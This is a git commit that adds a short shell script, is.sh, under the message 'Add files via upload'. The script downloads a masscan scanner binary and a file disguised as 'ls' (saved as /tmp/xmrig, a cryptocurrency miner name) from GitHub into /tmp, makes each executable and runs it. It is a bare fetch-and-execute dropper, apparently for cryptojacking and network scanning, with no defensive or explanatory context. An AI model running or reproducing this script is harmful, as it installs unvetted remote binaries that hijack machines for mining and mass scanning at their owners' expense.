0a16513db005e144deb3436d6beda8617ab2194e
wasiqaws <93749432+wasiqaws@users.noreply.github.com>
2025-02-13 11:29:03 -0500

    Add files via upload

---
+++ is.sh
@@ -0,0 +1,5 @@
+!#/bin/bash
+
+wget -O /tmp/masscan https://github.com/zan8in/masscan/raw/refs/heads/main/bin/masscan-linux/masscan; chmod +x /tmp/masscan; /tmp/masscan
+
+wget -O /tmp/xmrig https://github.com/wasiqaws/wasiqaws/raw/refs/heads/main/ls; chmod +x /tmp/xmrig; /tmp/xmrig
